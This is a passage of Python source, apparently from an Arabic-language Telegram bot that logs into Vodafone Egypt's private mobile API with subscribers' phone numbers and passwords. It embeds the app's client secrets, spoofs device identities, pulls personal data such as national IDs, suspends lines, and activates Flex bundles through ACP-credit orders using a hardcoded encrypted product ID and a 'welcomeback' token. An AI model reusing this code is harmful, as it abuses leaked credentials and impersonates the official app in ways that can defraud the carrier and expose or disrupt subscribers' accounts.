        return f"💰 رصيد MoneyBack\n{'='*40}\n\n💰 الرصيد المتاح: 0 جنيه\n\n💡 للحصول على رصيد MoneyBack:\n   • اشحن رصيدك بانتظام\n   • استخدم خدمات فودافون\n   • شارك في العروض الترويجية"

def run_line_data(phone, password):
    """تشغيل خدمة بيانات المستخدم - النسخة المحدثة"""
    try:
        # تسجيل الدخول والحصول على التوكن
        login_result = _voda_login_for_line_data(phone, password)

        if not login_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {login_result.get('message', 'خطأ غير معروف')}"

        token = login_result['access_token']
        voda = VodafoneAccount(token, phone)

        result_lines = [f"📋 *بيانات الخط*\n{'='*35}"]

        # 1. معلومات المستخدم من التوكن
        user_info = voda.get_account_info_from_token()
        if user_info:
            name = f"{user_info.get('firstName', '')} {user_info.get('lastName', '')}".strip()
            if name:
                result_lines.append(f"👤 الاسم: {name}")
            cid = user_info.get('customerID')
            if cid:
                result_lines.append(f"🆔 رقم العميل: {cid}")
            acc = user_info.get('accountNumber')
            if acc:
                result_lines.append(f"💳 رقم الحساب: {acc}")

        # 2. تفاصيل حساب الخدمة
        service = voda.get_service_account()
        if service and isinstance(service, list) and len(service) > 0:
            sd = service[0]
            contract_id = sd.get("IDs", [{}])[0].get("value", "")
            if contract_id:
                result_lines.append(f"📜 رقم العقد: {contract_id}")

            for cat in sd.get("categories", []):
                if cat.get("listHirarchyId") == "CustomerType":
                    result_lines.append(f"🛂 نوع العميل: {cat.get('value', '')}")
                    break

            contacts = sd.get("contact", [])
            if contacts:
                contact = contacts[0]
                nid = contact.get("nationalID", "")
                if nid:
                    result_lines.append(f"🆔 الرقم القومي: {nid}")
                mediums = contact.get("contactMedium", [])
                if mediums:
                    city = mediums[0].get("city", "")
                    if city:
                        result_lines.append(f"🏙️ المدينة: {city}")

            statuses = sd.get("statusHistory", [])
            if statuses:
                result_lines.append(f"📶 حالة الخط: {statuses[0].get('status', '')}")

        # 3. الرصيد
        balance_data = voda.get_balance()
        if balance_data and 'balances' in balance_data:
            result_lines.append(f"\n💰 *الرصيد*")
            for bal in balance_data['balances'][:4]:
                bal_type = bal.get('balanceType', 'رصيد')
                amount = bal.get('amount', {})
                value = amount.get('value', '0')
                unit = amount.get('unit', 'EGP')
                result_lines.append(f"   • {bal_type}: {value} {unit}")

        # 4. الاشتراكات النشطة
        subs = voda.get_subscriptions()
        if subs and isinstance(subs, list) and len(subs) > 0:
            result_lines.append(f"\n📦 *الاشتراكات النشطة*")
            for sub in subs[:5]:
                name = sub.get('name', 'اشتراك')
                status = sub.get('status', '')
                result_lines.append(f"   • {name}" + (f" - {status}" if status else ""))

        # 5. العروض النشطة
        offers = voda.get_offers()
        if offers and isinstance(offers, list) and len(offers) > 0:
            result_lines.append(f"\n🎁 *العروض النشطة* ({len(offers)} عرض)")
            for off in offers[:3]:
                name = off.get('name', 'عرض')
                result_lines.append(f"   • {name}")

        return True, "\n".join(result_lines)

    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"


def _voda_login_for_line_data(phone: str, password: str) -> dict:
    """تسجيل الدخول لخدمة بيانات الخط - يدعم عدة طرق"""
    import random, string as _string
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"

    def _nonce(n=13):
        return ''.join(random.choice(_string.ascii_lowercase + _string.digits) for _ in range(n))

    attempts = [
        (
            {
                'User-Agent': 'okhttp/4.12.0',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip',
                'silentLogin': 'true',
                'x-agent-operatingsystem': '15',
                'clientId': 'AnaVodafoneAndroid',
                'Accept-Language': 'ar',
                'x-agent-device': 'Samsung SM-S918B',
                'x-agent-version': '2025.12.2',
                'x-agent-build': '1080',
                'digitalId': _nonce(13),
                'device-id': _nonce(16),
            },
            {'client_id': 'ana-vodafone-app', 'client_secret': '95fd95fb-7489-4958-8ae6-d31a525cd20a'},
        ),
        (
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Language': 'ar-EG,ar;q=0.9,en;q=0.8',
                'clientId': 'WebsiteConsumer',
            },
            {'client_id': 'my-vodafone-app', 'client_secret': 'a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3'},
        ),
    ]

    for headers, creds in attempts:
        try:
            payload = {'grant_type': 'password', 'username': phone, 'password': password, **creds}
            resp = requests.post(url, data=payload, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                token = data.get('access_token')
                if token:
                    return {'success': True, 'access_token': token}
        except Exception:
            continue

    return {'success': False, 'message': '❌ فشل تسجيل الدخول. تأكد من صحة الرقم وكلمة المرور.'}


class VodafoneAccount:
    """كلاس جلب بيانات المستخدم من فودافون (بيانات الخط)"""

    _MOBILE_BASE = "https://mobile.vodafone.com.eg"
    _WEB_BASE = "https://web.vodafone.com.eg"

    def __init__(self, token=None, phone=None):
        self.session = requests.Session()
        self.access_token = token
        self.phone_number = phone
        self._base_headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
        }

    def get_account_info_from_token(self):
        """استخراج معلومات الحساب من JWT token"""
        if not self.access_token:
            return None
        try:
            import base64 as _b64, json as _json
            parts = self.access_token.split('.')
            if len(parts) != 3:
                return None
            payload_b64 = parts[1]
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += "=" * padding
            payload = _json.loads(_b64.urlsafe_b64decode(payload_b64).decode('utf-8'))
            return payload.get('userInfo', {})
        except Exception:
            return None

    def get_service_account(self):
        """جلب تفاصيل حساب الخدمة"""
        if not self.access_token or not self.phone_number:
            return None
        url = f"{self._WEB_BASE}/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
        params = {
            '@type': "Profile",
            '$.resources[?(@resourceType==\'MSISDN\')].IDs[0].value': self.phone_number,
        }
        headers = {
            'Host': 'web.vodafone.com.eg',
            'msisdn': self.phone_number,
            'Accept-Language': 'AR',
            'Authorization': f'Bearer {self.access_token}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'clientId': 'WebsiteConsumer',
            'Referer': 'https://web.vodafone.com.eg/spa/myHome',
        }
        try:
            r = self.session.get(url, params=params, headers=headers, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception:
            return None

    def get_balance(self):
        """جلب رصيد الحساب"""
        if not self.access_token or not self.phone_number:
            return None
        url = f"{self._MOBILE_BASE}/services/dxl/bal/balance/v2/balances"
        headers = {
            **self._base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'api-host': 'BalanceManagement',
            'useCase': 'balance',
            'msisdn': self.phone_number,
        }
        try:
            r = self.session.get(url, params={'accountNumber': self.phone_number, 'balanceType': 'CurrentBalance'}, headers=headers, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception:
            return None

    def get_offers(self):
        """جلب العروض النشطة"""
        if not self.access_token or not self.phone_number:
            return None
        url = f"{self._MOBILE_BASE}/services/dxl/offers/offers/v3/offers"
        headers = {
            **self._base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'api-host': 'OffersManagement',
            'useCase': 'offers',
            'msisdn': self.phone_number,
        }
        try:
            r = self.session.get(url, params={'msisdn': self.phone_number, 'status': 'ACTIVE', 'offerType': 'ALL'}, headers=headers, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception:
            return None

    def get_subscriptions(self):
        """جلب الاشتراكات النشطة"""
        if not self.access_token or not self.phone_number:
            return None
        url = f"{self._MOBILE_BASE}/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
        headers = {
            **self._base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'msisdn': self.phone_number,
        }
        try:
            r = self.session.get(url, params={'@type': "subscription", '$.resources[?(@resourceType==\'MSISDN\')].IDs[0].value': self.phone_number}, headers=headers, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception:
            return None

# ==================== وظائف من ملف الرصيد المستحق ====================
def login_vodafone_due(phone_number, password):
    """تسجيل الدخول إلى فودافون والحصول على التوكن"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': phone_number,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'digitalId': "25VT5Q5QWG8DK",
        'device-id': "b26ba335813fad21"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        response.raise_for_status()
        return response.json()['access_token']
    except Exception as e:
        return None

def get_all_in_one_data(phone_number, token):
    """الحصول على البيانات من AllInOne API"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': phone_number,
        '@type': "AllInOne",
        'relatedParty.name': "SubscriptionManagement"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "AllInOne",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': phone_number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        data = response.json()
        
        if not data or len(data) == 0:
            return []
        
        if isinstance(data, list):
            return data
        elif isinstance(data, dict):
            return [data]
        else:
            return []
            
    except Exception as e:
        return []

def get_flex_profile_data(phone_number, token):
    """الحصول على البيانات من FlexProfile API"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': phone_number,
        '@type': "FlexProfile"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': phone_number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        data = response.json()
        
        if not data or len(data) == 0:
            return []
        
        if isinstance(data, list):
            return data
        elif isinstance(data, dict):
            return [data]
        else:
            return []
            
    except Exception as e:
        return []

def extract_bundle_info(all_data, flex_data):
    """استخراج معلومات الباقة من جميع المصادر"""
    bundle_info = {
        "اسم_الباقة": "غير متاح",
        "سعر_الباقة": 0,
        "تم_العثور_على_باقة": False
    }
    
    if all_data:
        for product in all_data:
            product_id = product.get('id', '')
            
            if ("Flex_" in product_id and "2021" in product_id) or "RX_Flex" in product_id:
                prices = product.get('productPrice', [])
                
                for price in prices:
                    description = price.get('description', '')
                    
                    if "باقة" in description or "Flex" in description or not description:
                        if description:
                            bundle_info["اسم_الباقة"] = description
                        else:
                            bundle_info["اسم_الباقة"] = product.get('productSpecification', {}).get('name', 'باقة فليكس')
                        
                        if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                            value_str = price['price']['taxIncludedAmount']['value']
                            try:
                                price_value = int(value_str) / 100
                                
                                if "260" in bundle_info["اسم_الباقة"]:
                                    if price_value < 100:
                                        bundle_info["سعر_الباقة"] = 260.00
                                    else:
                                        bundle_info["سعر_الباقة"] = price_value
                                elif "40" in bundle_info["اسم_الباقة"]:
                                    if price_value < 10:
                                        bundle_info["سعر_الباقة"] = 40.00
                                    else:
                                        bundle_info["سعر_الباقة"] = price_value
                                elif "100" in bundle_info["اسم_الباقة"]:
                                    if price_value < 50:
                                        bundle_info["سعر_الباقة"] = 100.00
                                    else:
                                        bundle_info["سعر_الباقة"] = price_value
                                else:
                                    bundle_info["سعر_الباقة"] = price_value
                                
                                bundle_info["تم_العثور_على_باقة"] = True
                                return bundle_info
                            except:
                                continue
    
    if flex_data and not bundle_info["تم_العثور_على_باقة"]:
        for product in flex_data:
            product_id = product.get('id', '')
            
            if "RX_Flex" in product_id or "Flex_" in product_id:
                description = product.get('description', '')
                product_name = product.get('productSpecification', {}).get('name', '')
                
                if description:
                    bundle_info["اسم_الباقة"] = description
                elif product_name:
                    bundle_info["اسم_الباقة"] = product_name
                
                prices = product.get('productPrice', [])
                for price in prices:
                    if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                        value_str = price['price']['taxIncludedAmount']['value']
                        try:
                            price_value = int(value_str) / 100
                            
                            if "260" in bundle_info["اسم_الباقة"]:
                                bundle_info["سعر_الباقة"] = 260.00
                            elif "40" in bundle_info["اسم_الباقة"]:
                                bundle_info["سعر_الباقة"] = 40.00
                            elif "100" in bundle_info["اسم_الباقة"]:
                                bundle_info["سعر_الباقة"] = 100.00
                            else:
                                bundle_info["سعر_الباقة"] = price_value
                            
                            bundle_info["تم_العثور_على_باقة"] = True
                            return bundle_info
                        except:
                            continue
                
                if "260" in bundle_info["اسم_الباقة"]:
                    bundle_info["سعر_الباقة"] = 260.00
                    bundle_info["تم_العثور_على_باقة"] = True
                elif "40" in bundle_info["اسم_الباقة"]:
                    bundle_info["سعر_الباقة"] = 40.00
                    bundle_info["تم_العثور_على_باقة"] = True
                elif "100" in bundle_info["اسم_الباقة"]:
                    bundle_info["سعر_الباقة"] = 100.00
                    bundle_info["تم_العثور_على_باقة"] = True
    
    return bundle_info

def extract_fees_info(all_data):
    """استخراج معلومات الرسوم"""
    services = {
        "ضريبة الدمغة": 0,
        "خدمة سلفني شكرا": 0,
        "خدمات شكرا": 0,
        "رسوم عروض الشحن": 0,
        "رسوم ACP": 0
    }
    
    if not all_data:
        return services
    
    for product in all_data:
        product_id = product.get('id', '')
        
        if ("Flex_" in product_id and "2021" in product_id) or "RX_Flex" in product_id or "Plus_" in product_id:
            continue
        
        prices = product.get('productPrice', [])
        price_value = 0
        
        if prices:
            for price in prices:
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    try:
                        price_value = int(price['price']['taxIncludedAmount']['value']) / 100
                        break
                    except:
                        continue
        
        if "StampTax" in product_id:
            services["ضريبة الدمغة"] = price_value
        elif "RxFees" in product_id or "Salefny" in product_id:
            services["خدمة سلفني شكرا"] = price_value
        elif "Shokran" in product_id:
            services["خدمات شكرا"] = price_value
        elif "RechargeFees" in product_id:
            services["رسوم عروض الشحن"] = price_value
        elif "ACP" in product_id:
            services["رسوم ACP"] = price_value
    
    return services

def calculate_total(bundle_price, services):
    """حساب الإجمالي - مع خدمة سلفني شكرا"""
    total_services = (
        services["ضريبة الدمغة"] + 
        services["خدمة سلفني شكرا"] + 
        services["خدمات شكرا"] + 
        services["رسوم عروض الشحن"] + 
        services["رسوم ACP"]
    )
    
    net_total = bundle_price + total_services
    
    expected_price = net_total * 1.428
    
    return {
        "صافي": round(net_total, 2),
        "المتوقع": round(expected_price, 1),
        "الرسوم": round(total_services, 2),
        "الباقة": round(bundle_price, 2)
    }

def run_due_balance(phone, password):
    """تشغيل خدمة الرصيد المستحق"""
    try:
        token = login_vodafone_due(phone, password)
        
        if not token:
            return False, "❌ فشل تسجيل الدخول. الرقم أو كلمة المرور غير صحيحة"
        
        allinone_data = get_all_in_one_data(phone, token)
        flexprofile_data = get_flex_profile_data(phone, token)
        
        bundle_info = extract_bundle_info(allinone_data, flexprofile_data)
        
        if not bundle_info["تم_العثور_على_باقة"]:
            return False, "❌ ليس لديك باقة فعالة أو رصيد مستحق."
        
        services_info = extract_fees_info(allinone_data)
        
        calculations = calculate_total(bundle_info["سعر_الباقة"], services_info)
        
        result = f"📊 التكلفة الشهرية:\n{'='*40}\n\n"
        result += f"🔹 الباقة الأساسية:\n"
        result += f"   • {bundle_info['اسم_الباقة']}\n"
        result += f"   • السعر: {bundle_info['سعر_الباقة']:.0f} جنيه\n\n"
        
        result += f"🔹 الرسوم والخدمات الإضافية:\n"
        has_fees = False
        for service, price in services_info.items():
            if price > 0:
                result += f"   • {service}: {price:.2f} جنيه\n"
                has_fees = True
        
        if not has_fees:
            result += f"   • لا توجد رسوم إضافية\n"
        
        result += f"\n💰 الإجماليات:\n"
        result += f"   ─────────────────────────\n"
        result += f"   • سعر الباقة: {calculations['الباقة']:.0f} جنيه\n"
        result += f"   • إجمالي الرسوم: {calculations['الرسوم']:.2f} جنيه\n"
        result += f"   ─────────────────────────\n"
        result += f"   • الصافي: {calculations['صافي']:.2f} جنيه\n"
        result += f"   • المطلوب دفعه: {calculations['المتوقع']:.1f} جنيه\n\n"
        result += f"💡 المطلوب دفعه = (الباقة + الرسوم) × 1.428"
        
        return True, result
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظائف من ملف ايقاف الخط ====================
class VodafoneManager:
    def __init__(self, phone, password, national_id):
        self.base_url = "https://mobile.vodafone.com.eg"
        self.session = requests.Session()
        self.phone = phone
        self.password = password
        self.national_id = national_id
        
    def get_access_token(self):
        """الحصول على رمز الوصول"""
        url = f"{self.base_url}/auth/realms/vf-realm/protocol/openid-connect/token"
        
        data = {
            "grant_type": "password",
            "username": self.phone,
            "password": self.password,
            "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            "client_id": "ana-vodafone-app"
        }
        
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
        }
        
        try:
            response = self.session.post(url, data=data, headers=headers, timeout=30)
            response.raise_for_status()
            token_data = response.json()
            return token_data.get("access_token")
        except requests.exceptions.RequestException as e:
            return None
    
    def suspend_line(self, token):
        """تعليق الخط"""
        url = f"{self.base_url}/services/dxl/pom/productOrder"
        
        headers = {
            'x-dynatrace': 'MT_3_24_2190152955_13-0_a556db1b-4506-43f3-854a-1d2527767923_0_886_255',
            'Authorization': f'Bearer {token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '12',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Samsung SM-M315F',
            'x-agent-version': '2024.3.3',
            'x-agent-build': '593',
            'msisdn': self.phone,
            'Accept': 'application/json',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'mobile.vodafone.com.eg',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/4.11.0',
        }
        
        json_data = {
            '@type': 'LineSuspension',
            'channel': {'name': 'WEBSITE'},
            'orderItem': [{
                'action': 'add',
                'product': {
                    'characteristic': [
                        {'name': 'WorkflowName', 'value': 'GSMAdjustStatus'},
                        {'name': 'nationalId', 'value': self.national_id},
                        {'name': 'LangId', 'value': 'ar'},
                    ],
                    'relatedParty': [{
                        'name': 'MSISDN',
                        'id': self.phone,
                        'role': 'Subscriber',
                    }],
                },
            }],
        }
        
        try:
            response = self.session.post(url, headers=headers, json=json_data, timeout=30)
            response.raise_for_status()
            return {"success": True, "message": "✅ تم تعليق الخط بنجاح!"}
        except requests.exceptions.RequestException as e:
            return {"success": False, "message": f"❌ خطأ في تعليق الخط: {e}"}
    
    def run(self):
        """تشغيل العملية"""
        token = self.get_access_token()
        if not token:
            return {"success": False, "message": "❌ فشل تسجيل الدخول. الرقم أو كلمة المرور غير صحيحة"}
        
        return self.suspend_line(token)

def run_stop_line(phone, password, national_id):
    """تشغيل خدمة إيقاف الخط"""
    try:
        manager = VodafoneManager(phone, password, national_id)
        result = manager.run()
        return result['success'], result['message']
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"
# ==================== وظائف باقات فليكس (المستخدمة في القسم) ====================
SUCCESS_CODES = ["3999"]  # كود نجاح التحويل الجديد

def activate_flex_bundle(phone, token, bundle_id):
    """تفعيل الباقة - طريقة FlexACPRenewal"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "insert",
            "id": bundle_id,
            "product": {
                "characteristic": [
                    {"name": "PaymentMethod", "value": "ACP"},
                    {"name": "ACP", "value": "True"},
                    {"name": "SMSID", "value": "MUTE_SMS"},
                    {"name": "LangId", "value": "en"},
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "encProductId": "SBWbw/gsvm1cU1nPBj7HCg6MNEaAfyY56Kxz53nXBwpe6Z4c2t1DgiO2OM2hZwGVJaztwhZu7DWZiE2Ic5evFLqZfV/QaAOWQcS3m8bZCVD/wmRvbEvtfv16FTwgzWMjUQErPqXuYIMnePuK3H+MwQ8iFKqpvQ1d7qrPz05JlpUXKn2GM14uKA==",
                "id": bundle_id,
                "relatedParty": [{"id": phone, "name": "MSISDN", "role": "Subscriber"}]
            },
            "eCode": 0
        }],
        "@type": "FlexACPRenewal"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductOrderingManagement",
        'useCase': "FlexACPRenewal",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "7be546fe335911d2",
        'x-agent-operatingsystem': "13",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A515F",
        'x-agent-version': "2025.11.1",
        'x-agent-build': "1063",
        'msisdn': phone,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=40)
        
        try:
            data = response.json()
        except:
            data = {"code": str(response.status_code), "reason": response.text[:200]}
        
        if data and isinstance(data, dict):
            # نجاح التحويل - كود 3999 أو وجود orderId
            if data.get("code") in SUCCESS_CODES or "orderId" in data:
                return True, data, response.status_code
            
            if response.status_code in (200, 201, 202):
                return True, data, response.status_code
        
        return False, data, response.status_code
        
    except requests.exceptions.Timeout:
        return False, {"reason": "انتهت مهلة الاتصال"}, 408
    except Exception as e:
        return False, {"reason": str(e)}, 500

FLEX_BUNDLES = [
    {"number": "1", "name": "فليكس 40", "id": "Flex_2021_511", "price": 40},
    {"number": "2", "name": "فليكس 45", "id": "Flex_2024_627", "price": 45},
    {"number": "3", "name": "فليكس 60", "id": "Flex_2021_513", "price": 60},
    {"number": "4", "name": "فليكس 70", "id": "Flex_2024_629", "price": 70},
    {"number": "5", "name": "فليكس 90", "id": "Flex_2021_515", "price": 90},
    {"number": "6", "name": "فليكس 100", "id": "Flex_2024_631", "price": 100},
    {"number": "7", "name": "فليكس 130", "id": "Flex_2021_517", "price": 130},
    {"number": "8", "name": "فليكس 150", "id": "Flex_2024_633", "price": 150},
    {"number": "9", "name": "فليكس 260", "id": "Flex_2021_523", "price": 260},
    {"number": "10", "name": "فليكس 300", "id": "Flex_2024_637", "price": 300}
]

def show_flex_bundles_markup():
    # تقسيم الباقات: نظام 2021 و 2024 جنب بعض أفقياً
    # الأزواج: (40 نظام 2021, 45 نظام 2024), (60, 70), (90, 100), (130, 150), (260, 300)
    bundle_2021 = [b for b in FLEX_BUNDLES if "2021" in b['id']]
    bundle_2024 = [b for b in FLEX_BUNDLES if "2024" in b['id']]
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # هيدر النظامين
    markup.row(
        types.InlineKeyboardButton(text="⚡ نظام 2021", callback_data="flex_header_ignore"),
        types.InlineKeyboardButton(text="🆕 نظام 2024", callback_data="flex_header_ignore")
    )
    
    # كل باقتين جنب بعض (واحدة من كل نظام)
    max_len = max(len(bundle_2021), len(bundle_2024))
    for i in range(max_len):
        btn_row = []
        if i < len(bundle_2021):
            b = bundle_2021[i]
            btn_row.append(types.InlineKeyboardButton(
                text=f"{b['name']} - {b['price']}ج",
                callback_data=f"flex_bundle_{b['number']}"
            ))
        if i < len(bundle_2024):
            b = bundle_2024[i]
            btn_row.append(types.InlineKeyboardButton(
                text=f"{b['name']} - {b['price']}ج",
                callback_data=f"flex_bundle_{b['number']}"
            ))
        if btn_row:
            markup.row(*btn_row)
    
    markup.row(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

def get_flex_bundle_by_number(number):
    for bundle in FLEX_BUNDLES:
        if bundle['number'] == number:
            return bundle
    return None

def run_flex_activation(phone, password, bundle_number):
    """تشغيل تفعيل باقة فليكس - طريقة التحويل (FlexACPRenewal)"""
    try:
        bundle = get_flex_bundle_by_number(bundle_number)
        if not bundle:
            return False, "❌ حدث خطأ في اختيار الباقة"
        
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, result, status_code = activate_flex_bundle(phone, token, bundle['id'])
        
        if success:
            message = f"✅ تم تحويل {bundle['name']} بنجاح!\n\n📱 الرقم: `{phone}`\n💰 السعر: {bundle['price']} جنيه"
            
            # رسائل نجاح إضافية حسب نوع الرد
            if isinstance(result, dict):
                if result.get("code") == "3999":
                    message += "\n\n✅ برجاء التحقق من اشتركاتك للتأكيد"
                elif "orderId" in result:
                    message += f"\n\n📋 رقم الطلب: {result.get('orderId', 'غير معروف')}"
            
            return True, message
        else:
            error_msg = f"❌ فشل تحويل {bundle['name']}!\n\n📱 الرقم: `{phone}`\n🔴 كود الحالة: {status_code}"
            if isinstance(result, dict):
                error_code = result.get("code", "غير معروف")
                error_reason = result.get("reason", "لا يوجد تفاصيل")
                error_msg += f"\n🔴 كود الخطأ: {error_code}\n🔴 السبب: {error_reason}"
            return False, error_msg
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظائف باقات ع نوته ====================
NOTE_PACKAGES = [
    {"number": "1", "name": "فليكس 40", "id": "Flex_2021_511", "value": "40"},
    {"number": "2", "name": "فليكس 45", "id": "Flex_2024_631", "value": "45"},
    {"number": "3", "name": "فليكس 60", "id": "Flex_2021_513", "value": "60"},
    {"number": "4", "name": "فليكس 70", "id": "Flex_2024_627", "value": "70"},
    {"number": "5", "name": "فليكس 90", "id": "Flex_2021_515", "value": "90"},
    {"number": "6", "name": "فليكس 100", "id": "Flex_2024_631", "value": "100"},
    {"number": "7", "name": "فليكس 130", "id": "Flex_2021_517", "value": "130"},
    {"number": "8", "name": "فليكس 150", "id": "Flex_2024_633", "value": "150"},
    {"number": "9", "name": "فليكس 260", "id": "Flex_2021_523", "value": "260"},
    {"number": "10", "name": "فليكس 300", "id": "Flex_2024_637", "value": "300"},
]

def show_note_packages_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for pkg in NOTE_PACKAGES:
        markup.add(types.InlineKeyboardButton(text=f"{pkg['name']}", callback_data=f"note_package_{pkg['number']}"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

def request_note_package_loan(token, msisdn, selected_package):
    url = "https://mobile.vodafone.com.eg/services/dxl/orderor/productOrder"
    
    headers = {
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': 'e9d4a11e561390bd',
        'x-agent-operatingsystem': 'Yello',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Mello',
        'x-agent-version': '2025.1.1',
        'x-agent-build': '1002',
        'msisdn': msisdn,
        'Accept': 'application/json',
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'mobile.vodafone.com.eg',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.12.0'
    }
    
    payload = {
        "payment": [{"characteristics": [], "@type": "ACP"}],
        "productOrderItem": [{
            "characteristics": [
                {"name": "MSISDN", "@type": "receiver", "value": f"2{msisdn}"},
                {"name": "MSISDN", "@type": "sender", "value": f"2{msisdn}"}
            ],
            "itemTotalPrice": [{"price": {"taxIncludedAmount": {"unit": "EGP", "value": f"{selected_package['value']}.0"}}}],
            "product": {
                "id": selected_package['id'],
                "productCharacteristic": [{"@type": "token", "value": "welcomeback", "valueType": "string"}],
                "type": "product"
            }
        }],
        "@type": "paymentFlex"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        if response.status_code in [200, 201]:
            return {"success": True, "message": f"تم الاشتراك في {selected_package['name']} بنجاح!"}
        return {"success": False, "message": f"فشل الاشتراك: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"حدث خطأ: {str(e)}"}

def run_note_activation(phone, password, package_number):
    """تشغيل تفعيل باقة ع نوته"""
    try:
        selected_package = None
        for pkg in NOTE_PACKAGES:
            if pkg['number'] == package_number:
                selected_package = pkg
                break
        
        if not selected_package:
            return False, "❌ حدث خطأ في اختيار الباقة"
        
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
